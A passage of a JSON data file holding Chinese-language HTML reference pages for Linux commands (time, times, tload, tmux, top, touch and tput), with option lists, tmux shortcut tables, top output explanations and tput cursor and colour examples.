sys时间是指花费在内核模式中的CPU时间，代表在内核中执系统调用所花费的时间，这也是真正由进程使用的CPU时间。</li>\n</ul>\n<p>shell内建也有一个time命令，当运行time时候是调用的系统内建命令，应为系统内建的功能有限，所以需要时间其他功能需要使用time命令可执行二进制文件<code>/usr/bin/time</code>。</p>\n<p>使用<code>-o</code>选项将执行时间写入到文件中：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/usr/</span>bin/time -o outfile.txt ls\n</code></pre>\n<p>使用<code>-a</code>选项追加信息：</p>\n<pre><code class=\"language-shell\">/usr/bin/<span class=\"hljs-selector-tag\">time</span> -<span class=\"hljs-selector-tag\">a</span> -o outfile<span class=\"hljs-selector-class\">.txt</span> ls\n</code></pre>\n<p>使用<code>-f</code>选项格式化时间输出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/usr/</span>bin/time -f <span class=\"hljs-string\">\"time: %U\"</span> ls\n</code></pre>\n<p><code>-f</code>选项后的参数：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>%E</code></td>\n<td>real时间，显示格式为[小时:]分钟:秒</td>\n</tr>\n<tr>\n<td><code>%U</code></td>\n<td>user时间。</td>\n</tr>\n<tr>\n<td><code>%S</code></td>\n<td>sys时间。</td>\n</tr>\n<tr>\n<td><code>%C</code></td>\n<td>进行计时的命令名称和命令行参数。</td>\n</tr>\n<tr>\n<td><code>%D</code></td>\n<td>进程非共享数据区域，以KB为单位。</td>\n</tr>\n<tr>\n<td><code>%x</code></td>\n<td>命令退出状态。</td>\n</tr>\n<tr>\n<td><code>%k</code></td>\n<td>进程接收到的信号数量。</td>\n</tr>\n<tr>\n<td><code>%w</code></td>\n<td>进程被交换出主存的次数。</td>\n</tr>\n<tr>\n<td><code>%Z</code></td>\n<td>系统的页面大小，这是一个系统常量，不用系统中常量值也不同。</td>\n</tr>\n<tr>\n<td><code>%P</code></td>\n<td>进程所获取的CPU时间百分百，这个值等于 <code>user+system</code> 时间除以总共的运行时间。</td>\n</tr>\n<tr>\n<td><code>%K</code></td>\n<td>进程的平均总内存使用量（data+stack+text），单位是 <code>KB</code>。</td>\n</tr>\n<tr>\n<td><code>%w</code></td>\n<td>进程主动进行上下文切换的次数，例如等待I/O操作完成。</td>\n</tr>\n<tr>\n<td><code>%c</code></td>\n<td>进程被迫进行上下文切换的次数（由于时间片到期）。</td>\n</tr>\n</tbody></table>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "times",
        "des": "显示进程累计时间。",
        "body": "<h1 id=\"times\">times</h1>\n<p>显示进程累计时间。</p>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>打印出shell及其子进程累计使用的用户时间和系统时间。</li>\n</ul>\n<h2 id=\"返回值\">返回值</h2>\n<p>总是返回成功。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 执行命令</span>\n<span class=\"hljs-attribute\">times</span>\n<span class=\"hljs-comment\"># 返回结果</span>\n<span class=\"hljs-attribute\">0m0</span>.<span class=\"hljs-number\">037</span>s <span class=\"hljs-number\">0</span>m0.<span class=\"hljs-number\">009</span>s\n<span class=\"hljs-attribute\">0m0</span>.<span class=\"hljs-number\">010</span>s <span class=\"hljs-number\">0</span>m0.<span class=\"hljs-number\">024</span>s\n<span class=\"hljs-comment\"># 根据times(2)的man手册，对应关系如下：</span>\n<span class=\"hljs-comment\"># 用户时间        | 系统时间</span>\n<span class=\"hljs-comment\"># 子进程的用户时间 | 子进程的系统时间</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tload",
        "des": "显示系统负载状况",
        "body": "<h1 id=\"tload\">tload</h1>\n<p>显示系统负载状况</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tload命令</strong> 以图形化的方式输出当前系统的平均负载到指定的终端。假设不给予终端机编号，则会在执行tload指令的终端机显示负载情形。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">tload</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-s：指定闲时的刻度；</span>\n<span class=\"hljs-deletion\">-d：指定间隔的时间（秒）。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>终端：指定显示信息的终端设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用tload命令查看系统负载情况：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tload</span> -d <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">0</span>.<span class=\"hljs-number\">08</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">02</span>,<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>\n<span class=\"hljs-attribute\">0</span>.<span class=\"hljs-number\">04</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>\n<span class=\"hljs-attribute\">0</span>.<span class=\"hljs-number\">04</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>\n<span class=\"hljs-attribute\">0</span>.<span class=\"hljs-number\">04</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">01</span>,<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>\n<span class=\"hljs-attribute\">0</span>.<span class=\"hljs-number\">06</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">02</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "tmux",
        "des": "Tmux是一个优秀的终端复用软件，类似GNU Screen，但来自于OpenBSD，采用BSD授权",
        "body": "<h1 id=\"tmux\">tmux</h1>\n<p>Tmux是一个优秀的终端复用软件，类似GNU Screen，但来自于OpenBSD，采用BSD授权</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>使用它最直观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机；</p>\n<h2 id=\"功能\">功能</h2>\n<ul>\n<li> 提供了强劲的、易于使用的命令行界面。</li>\n<li> 可横向和纵向分割窗口。</li>\n<li> 窗格可以自由移动和调整大小，或直接利用四个预设布局之一。</li>\n<li> 支持 UTF-8 编码及 256 色终端。</li>\n<li> 可在多个缓冲区进行复制和粘贴。</li>\n<li> 可通过交互式菜单来选择窗口、会话及客户端。</li>\n<li> 支持跨窗口搜索。</li>\n<li> 支持自动及手动锁定窗口。</li>\n</ul>\n<h2 id=\"安装\">安装</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 在 Mac OS 中，通过 brew 安装</span>\nbrew <span class=\"hljs-keyword\">install</span> tmux\n<span class=\"hljs-comment\"># ubuntu版本下直接apt-get安装</span>\nsudo apt-get <span class=\"hljs-keyword\">install</span> tmux\n<span class=\"hljs-comment\"># centos7版本下直接yum安装</span>\nyum <span class=\"hljs-keyword\">install</span> -y tmux\n\n<span class=\"hljs-comment\"># centos6版本需要编译安装</span>\nyum <span class=\"hljs-keyword\">install</span> libevent libevent-devel ncurses-devel\ntar -zvxf tmux-<span class=\"hljs-number\">2.3</span>.tar.gz <span class=\"hljs-comment\"># (提前下载：wget https://github.com/tmux/tmux/releases/download/2.3/tmux-2.3.tar.gz)</span>\ncd tmux-<span class=\"hljs-number\">2.3</span>\n./configure\nmake &amp;&amp; make <span class=\"hljs-keyword\">install</span>\n</code></pre>\n<h2 id=\"快捷键使用说明\">快捷键使用说明</h2>\n<table class=\"table-view log-set-param\">\n<tbody>\n<tr>\n<td colspan=\"2\" align=\"left\" valign=\"center\" width=\"0\">\n  <div>Ctrl+b</div>\n</td>\n<td>\n  <div>激活控制台；此时以下按键生效</div>\n</td>\n</tr>\n<tr>\n<td rowspan=\"9\" align=\"left\" valign=\"center\" width=\"0\">\n  <div>系统操作</div>\n</td>\n<td>\n  <div>?</div>\n</td>\n<td>\n  <div>列出所有快捷键；按q返回</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>d</div>\n</td>\n<td>\n  <div>脱离当前会话；这样可以暂时返回Shell界面，输入tmux attach能够重新进入之前的会话</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>D</div>\n</td>\n<td>\n  <div>选择要脱离的会话；在同时开启了多个会话时使用</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Ctrl+z</div>\n</td>\n<td>\n  <div>挂起当前会话</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>r</div>\n</td>\n<td>\n  <div>强制重绘未脱离的会话</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>s</div>\n</td>\n<td>\n  <div>选择并切换会话；在同时开启了多个会话时使用</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>:</div>\n</td>\n<td>\n  <div>进入命令行模式；此时可以输入支持的命令，例如kill-server可以关闭服务器</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>[</div>\n</td>\n<td>\n  <div>进入复制模式；此时的操作与vi/emacs相同，按q/Esc退出</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>~</div>\n</td>\n<td>\n  <div>列出提示信息缓存；其中包含了之前tmux返回的各种提示信息</div>\n</td>\n</tr>\n<tr>\n<td rowspan=\"10\" align=\"left\" valign=\"center\" width=\"0\">\n  <div>窗口操作</div>\n</td>\n<td>\n  <div>c</div>\n</td>\n<td>\n  <div>创建新窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>&amp;</div>\n</td>\n<td>\n  <div>关闭当前窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>数字键</div>\n</td>\n<td>\n  <div>切换至指定窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>p</div>\n</td>\n<td>\n  <div>切换至上一窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>n</div>\n</td>\n<td>\n  <div>切换至下一窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>l</div>\n</td>\n<td>\n  <div>在前后两个窗口间互相切换</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>w</div>\n</td>\n<td>\n  <div>通过窗口列表切换窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>,</div>\n</td>\n<td>\n  <div>重命名当前窗口；这样便于识别</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>.</div>\n</td>\n<td>\n  <div>修改当前窗口编号；相当于窗口重新排序</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>f</div>\n</td>\n<td>\n  <div>在所有窗口中查找指定文本</div>\n</td>\n</tr>\n<tr>\n<td rowspan=\"14\" align=\"left\" valign=\"center\" width=\"0\">\n  <div>面板操作</div>\n</td>\n<td>\n  <div>”</div>\n</td>\n<td>\n  <div>将当前面板平分为上下两块</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>%</div>\n</td>\n<td>\n  <div>将当前面板平分为左右两块</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>x</div>\n</td>\n<td>\n  <div>关闭当前面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>!</div>\n</td>\n<td>\n  <div>将当前面板置于新窗口；即新建一个窗口，其中仅包含当前面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Ctrl+方向键</div>\n</td>\n<td>\n  <div>以1个单元格为单位移动边缘以调整当前面板大小</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Alt+方向键</div>\n</td>\n<td>\n  <div>以5个单元格为单位移动边缘以调整当前面板大小</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Space</div>\n</td>\n<td>\n  <div>在预置的面板布局中循环切换；依次包括even-horizontal、even-vertical、main-horizontal、main-vertical、tiled</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>q</div>\n</td>\n<td>\n  <div>显示面板编号</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>o</div>\n</td>\n<td>\n  <div>在当前窗口中选择下一面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>方向键</div>\n</td>\n<td>\n  <div>移动光标以选择面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>{</div>\n</td>\n<td>\n  <div>向前置换当前面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>}</div>\n</td>\n<td>\n  <div>向后置换当前面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Alt+o</div>\n</td>\n<td>\n  <div>逆时针旋转当前窗口的面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Ctrl+o</div>\n</td>\n<td>\n  <div>顺时针旋转当前窗口的面板</div>\n</td>\n</tr>\n</tbody>\n</table>\n\n<p>1）进入tmux面板后，一定要先按ctrl+b，然后松开，再按其他的组合键才生效。\n2）常用到的几个组合键：</p>\n<pre><code class=\"language-shell\">ctrl+b ?        <span class=\"hljs-meta\">#     显示快捷键帮助</span>\nctrl+b 空格键   <span class=\"hljs-meta\">#     采用下一个内置布局，这个很有意思，在多屏时，用这个就会将多有屏幕竖着展示</span>\nctrl+b !        <span class=\"hljs-meta\">#     把当前窗口变为新窗口</span>\nctrl+b  <span class=\"hljs-string\">\"       #     模向分隔窗口</span>\nctrl+b %        <span class=\"hljs-meta\">#     纵向分隔窗口</span>\nctrl+b q        <span class=\"hljs-meta\">#     显示分隔窗口的编号</span>\nctrl+b o        <span class=\"hljs-meta\">#     跳到下一个分隔窗口。多屏之间的切换</span>\nctrl+b 上下键   <span class=\"hljs-meta\">#    上一个及下一个分隔窗口</span>\nctrl+b C-方向键 <span class=\"hljs-meta\">#    调整分隔窗口大小</span>\nctrl+b <span class=\"hljs-meta\">&amp;        #    确认后退出当前tmux</span>\nctrl+b [        <span class=\"hljs-meta\">#    复制模式，即将当前屏幕移到上一个的位置上，其他所有窗口都向前移动一个。</span>\nctrl+b c        <span class=\"hljs-meta\">#    创建新窗口</span>\nctrl+b n        <span class=\"hljs-meta\">#    选择下一个窗口</span>\nctrl+b l        <span class=\"hljs-meta\">#    最后使用的窗口</span>\nctrl+b p        <span class=\"hljs-meta\">#    选择前一个窗口</span>\nctrl+b w        <span class=\"hljs-meta\">#    以菜单方式显示及选择窗口</span>\nctrl+b s        <span class=\"hljs-meta\">#    以菜单方式显示和选择会话。这个常用到，可以选择进入哪个tmux</span>\nctrl+b t        <span class=\"hljs-meta\">#    显示时钟。然后按enter键后就会恢复到shell终端状态</span>\nctrl+b d        <span class=\"hljs-meta\">#    脱离当前会话；这样可以暂时返回Shell界面，输入tmux attach能够重新进入之前的会话</span>\n</code></pre>\n<h2 id=\"参考资料\">参考资料</h2>\n<ul>\n<li>tmux 官网下载地址：<a href=\"http://tmux.github.io/\">http://tmux.github.io/</a> </li>\n</ul>\n"
    },
    {
        "title": "top",
        "des": "显示或管理执行中的程序",
        "body": "<h1 id=\"top\">top</h1>\n<p>显示或管理执行中的程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>top命令</strong> 可以实时动态地查看系统的整体运行情况，是一个综合了多方信息监测系统性能和运行信息的实用工具。通过top命令所提供的互动式界面，用热键可以管理。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">top</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：以批处理模式操作；</span>\n<span class=\"hljs-deletion\">-c：显示完整的治命令；</span>\n<span class=\"hljs-deletion\">-d：屏幕刷新间隔时间；</span>\n<span class=\"hljs-deletion\">-I：忽略失效过程；</span>\n<span class=\"hljs-deletion\">-s：保密模式；</span>\n<span class=\"hljs-deletion\">-S：累积模式；</span>\n<span class=\"hljs-deletion\">-i&lt;时间&gt;：设置间隔时间；</span>\n<span class=\"hljs-deletion\">-u&lt;用户名&gt;：指定用户名；</span>\n<span class=\"hljs-deletion\">-p&lt;进程号&gt;：指定进程；</span>\n<span class=\"hljs-deletion\">-n&lt;次数&gt;：循环显示的次数。</span>\n</code></pre>\n<h3 id=\"top交互命令\">top交互命令</h3>\n<p>在top命令执行过程中可以使用的一些交互命令。这些命令都是单字母的，如果在命令行中使用了-s选项，&nbsp;其中一些命令可能会被屏蔽。</p>\n<pre><code class=\"language-shell\">h：显示帮助画面，给出一些简短的命令总结说明；\nk：终止一个进程；\n<span class=\"hljs-selector-tag\">i</span>：忽略闲置和僵死进程，这是一个开关式命令；\n<span class=\"hljs-selector-tag\">q</span>：退出程序；\nr：重新安排一个进程的优先级别；\nS：切换到累计模式；\ns：改变两次刷新之间的延迟时间（单位为s），如果有小数，就换算成ms。输入<span class=\"hljs-number\">0</span>值则系统将不断刷新，默认值是<span class=\"hljs-number\">5s</span>；\nf或者F：从当前显示中添加或者删除项目；\no或者O：改变显示项目的顺序；\nl：切换显示平均负载和启动时间信息；\nm：切换显示内存信息；\nt：切换显示进程和CPU状态信息；\nc：切换显示命令名称和完整命令行；\nM：根据驻留内存大小进行排序；\n<span class=\"hljs-selector-tag\">P</span>：根据CPU使用百分比大小进行排序；\nT：根据时间/累计时间进行排序；\nw：将当前设置写入~/<span class=\"hljs-selector-class\">.toprc</span>文件中。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">top</span> - <span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">56</span> up <span class=\"hljs-number\">16</span> days, <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">23</span>,  <span class=\"hljs-number\">1</span> user,  load average: <span class=\"hljs-number\">9</span>.<span class=\"hljs-number\">59</span>, <span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">75</span>, <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">92</span>\n<span class=\"hljs-attribute\">Tasks</span>: <span class=\"hljs-number\">145</span> total,   <span class=\"hljs-number\">2</span> running, <span class=\"hljs-number\">143</span> sleeping,   <span class=\"hljs-number\">0</span> stopped,   <span class=\"hljs-number\">0</span> zombie\n<span class=\"hljs-attribute\">Cpu</span>(s): <span class=\"hljs-number\">99</span>.<span class=\"hljs-number\">8</span>%us,  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">1</span>%sy,  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%ni,  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">2</span>%id,  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%wa,  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%hi,  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%si,  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%st\n<span class=\"hljs-attribute\">Mem</span>:   <span class=\"hljs-number\">4147888</span>k total,  <span class=\"hljs-number\">2493092</span>k used,  <span class=\"hljs-number\">1654796</span>k free,   <span class=\"hljs-number\">158188</span>k buffers\n<span class=\"hljs-attribute\">Swap</span>:  <span class=\"hljs-number\">5144568</span>k total,       <span class=\"hljs-number\">56</span>k used,  <span class=\"hljs-number\">5144512</span>k free,  <span class=\"hljs-number\">2013180</span>k cached\n</code></pre>\n<p> <strong>解释：</strong> </p>\n<ul>\n<li> top - 09:44:56[当前系统时间],</li>\n<li> 16 days[系统已经运行了16天],</li>\n<li> 1 user[个用户当前登录],</li>\n<li> load average: 9.59, 4.75, 1.92[系统负载，即任务队列的平均长度]</li>\n<li> Tasks: 145 total[总进程数],</li>\n<li> 2 running[正在运行的进程数],</li>\n<li> 143 sleeping[睡眠的进程数],</li>\n<li> 0 stopped[停止的进程数],</li>\n<li> 0 zombie[冻结进程数],</li>\n<li> Cpu(s): 99.8%us[用户空间占用CPU百分比],</li>\n<li> 0.1%sy[内核空间占用CPU百分比],</li>\n<li> 0.0%ni[用户进程空间内改变过优先级的进程占用CPU百分比],</li>\n<li> 0.2%id[空闲CPU百分比], 0.0%wa[等待输入输出的CPU时间百分比],</li>\n<li> 0.0%hi[],</li>\n<li> 0.0%st[],</li>\n<li> Mem: 4147888k total[物理内存总量],</li>\n<li> 2493092k used[使用的物理内存总量],</li>\n<li> 1654796k free[空闲内存总量],</li>\n<li> 158188k buffers[用作内核缓存的内存量]</li>\n<li> Swap:&nbsp; 5144568k total[交换区总量],</li>\n<li> 56k used[使用的交换区总量],</li>\n<li> 5144512k free[空闲交换区总量],</li>\n<li> 2013180k cached[缓冲的交换区总量],</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "touch",
        "des": "创建新的空文件",
        "body": "<h1 id=\"touch\">touch</h1>\n<p>创建新的空文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>touch命令</strong> 有两个功能：一是用于把已存在文件的时间标签更新为系统当前的时间（默认方式），它们的数据将原封不动地保留下来；二是用来创建新的空文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">touch</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：或--time=atime或--time=access或--time=use  只更改存取时间；</span>\n<span class=\"hljs-deletion\">-c：或--no-create  不建立任何文件；</span>\n<span class=\"hljs-deletion\">-d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间；</span>\n<span class=\"hljs-deletion\">-f：此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题；</span>\n<span class=\"hljs-deletion\">-m：或--time=mtime或--time=modify  只更该变动时间；</span>\n<span class=\"hljs-deletion\">-r：&lt;参考文件或目录&gt;  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span>\n<span class=\"hljs-deletion\">-t：&lt;日期时间&gt;  使用指定的日期时间，而非现在的时间；</span>\n<span class=\"hljs-deletion\">--help：在线帮助；</span>\n<span class=\"hljs-deletion\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要设置时间属性的文件列表。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">touch</span> ex2\n</code></pre>\n<p>在当前目录下建立一个空文件ex2，然后，利用<code>ls -l</code>命令可以发现文件ex2的大小为0，表示它是空文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "tput",
        "des": "通过terminfo数据库对终端会话进行初始化和操作",
        "body": "<h1 id=\"tput\">tput</h1>\n<p>通过terminfo数据库对终端会话进行初始化和操作</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tput命令</strong> 将通过 terminfo 数据库对您的终端会话进行初始化和操作。通过使用 tput，您可以更改几项终端功能，如移动或更改光标、更改文本属性，以及清除终端屏幕的特定区域。</p>\n<h3 id=\"什么是-terminfo-数据库？\">什么是 terminfo 数据库？</h3>\n<p>UNIX 系统上的 terminfo 数据库用于定义终端和打印机的属性及功能，包括各设备（例如，终端和打印机）的行数和列数以及要发送至该设备的文本的属性。UNIX 中的几个常用程序都依赖 terminfo 数据库提供这些属性以及许多其他内容，其中包括 vi 和 emacs 编辑器以及 curses 和 man 程序。</p>\n<p>与 UNIX 中的大多数命令一样，tput 命令既可以用在 shell 命令行中也可以用在 shell 脚本中。为让您更好地理解 tput，本文首先从命令行讲起，然后紧接着讲述 shell 脚本示例。</p>\n<p> <strong>光标属性</strong> </p>\n<p>在 UNIX shell 脚本中或在命令行中，移动光标或更改光标属性可能是非常有用的。有些情况下，您可能需要输入敏感信息（如密码），或在屏幕上两个不同的区域输入信息。在此类情况下，使用 tput 可能会对您有所帮助。</p>\n<pre><code class=\"language-shell\">tput clear <span class=\"hljs-comment\"># 清屏</span>\ntput sc <span class=\"hljs-comment\"># 保存当前光标位置</span>\ntput cup <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">13</span> <span class=\"hljs-comment\"># 将光标移动到 row col</span>\ntput civis <span class=\"hljs-comment\"># 光标不可见</span>\ntput cnorm <span class=\"hljs-comment\"># 光标可见</span>\ntput rc <span class=\"hljs-comment\"># 显示输出</span>\n<span class=\"hljs-keyword\">exit</span> <span class=\"hljs-number\">0</span>\n</code></pre>\n<p> <strong>移动光标</strong> </p>\n<p>使用 tput 可以方便地实现在各设备上移动光标的位置。通过在 tput 中使用 cup 选项，或光标位置，您可以在设备的各行和各列中将光标移动到任意 X 或 Y 坐标。设备左上角的坐标为 (0,0)。</p>\n<p>要在设备上将光标移动到第 5 列 (X) 的第 1 行 (Y)，只需执行 tput cup 5 1。另一个示例是 tput cup 23 45，此命令将使光标移动到第 23 列上的第 45 行。</p>\n<p> <strong>移动光标并显示信息</strong> </p>\n<p>另一种有用的光标定位技巧是移动光标，执行用于显示信息的命令，然后返回到前一光标位置：</p>\n<pre><code class=\"language-shell\">(tput sc ; tput cup <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">45</span> ; <span class=\"hljs-built_in\">echo</span> “Input from tput/<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-built_in\">at</span> <span class=\"hljs-number\">23</span>/<span class=\"hljs-number\">45</span>” ; tput rc)\n</code></pre>\n<p>下面我们分析一下 subshell 命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tput sc</span>\n</code></pre>\n<p>必须首先保存当前的光标位置。要保存当前的光标位置，请包括 sc 选项或“save cursor position”。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tput</span> cup <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">45</span>\n</code></pre>\n<p>在保存了光标位置后，光标坐标将移动到 (23,45)。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">echo</span> “Input from tput/<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-built_in\">at</span> <span class=\"hljs-number\">23</span>/<span class=\"hljs-number\">45</span>”\n</code></pre>\n<p>将信息显示到 stdout 中。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tput rc</span>\n</code></pre>\n<p>在显示了这些信息之后，光标必须返回到使用 tput sc 保存的原始位置。要使光标返回到其上次保存的位置，请包括 rc 选项或“restore cursor position”。</p>\n<p>注意：由于本文首先详细介绍了通过命令行执行 tput，因此您可能会觉得在自己的 subshell 中执行命令要比单独执行每条命令然后在每条命令执行之前显示提示更简洁。</p>\n<p> <strong>更改光标的属性</strong> </p>\n<p>在向某一设备显示数据时，很多时候您并不希望看到光标。将光标转换为不可见可以使数据滚动时的屏幕看起来更整洁。要使光标不可见，请使用 civis 选项（例如，tput civis）。在数据完全显示之后，您可以使用 cnorm 选项将光标再次转变为可见。</p>\n<p> <strong>文本属性</strong> </p>\n<p>更改文本的显示方式可以让用户注意到菜单中的一组词或警惕用户注意某些重要的内容。您可以通过以下方式更改文本属性：使文本加粗、在文本下方添加下划线、更改背景颜色和前景颜色，以及逆转颜色方案等。</p>\n<p>要更改文本的颜色，请使用 setb 选项（用于设置背景颜色）和 setf 选项（用于设置前景颜色）以及在 terminfo 数据库中分配的颜色数值。通常情况下，分配的数值与颜色的对应关系如下，但是可能会因 UNIX 系统的不同而异：</p>\n<ul>\n<li>  0：黑色</li>\n<li>  1：蓝色</li>\n<li>  2：绿色</li>\n<li>  3：青色</li>\n<li>  4：红色</li>\n<li>  5：洋红色</li>\n<li>  6：黄色</li>\n<li>  7：白色</li>\n</ul>\n<p>执行以下示例命令可以将背景颜色更改为黄色，将前景颜色更改为红色：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tput</span> setb <span class=\"hljs-number\">6</span> tput setf <span class=\"hljs-number\">4</span>\n</code></pre>\n<p>要反显当前的颜色方案，只需执行<code>tput rev</code>。</p>\n<p>有时，仅为文本着色还不够，也就是说，您想要通过另一种方式引起用户的注意。可以通过两种方式达到这一目的：一是将文本设置为粗体，二是为文本添加下划线。</p>\n<p>要将文本更改为粗体，请使用 bold 选项。要开始添加下划线，请使用 smul 选项。在完成显示带下划线的文本后，请使用 rmul 选项。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使输出的字符串有颜色，底色，加粗：</p>\n<pre><code class=\"language-shell\">#!/bin/bash\nprintf <span class=\"hljs-constructor\">$(<span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">setaf</span> 2; <span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">bold</span>)</span>'color show\\n\\n'<span class=\"hljs-constructor\">$(<span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">sgr0</span>)</span>\n\n<span class=\"hljs-keyword\">for</span>((i=<span class=\"hljs-number\">0</span>; i&lt;=<span class=\"hljs-number\">7</span>; i++)); <span class=\"hljs-keyword\">do</span>\n    echo <span class=\"hljs-constructor\">$(<span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">setaf</span> $<span class=\"hljs-params\">i</span>)</span><span class=\"hljs-string\">\"show me the money\"</span><span class=\"hljs-constructor\">$(<span 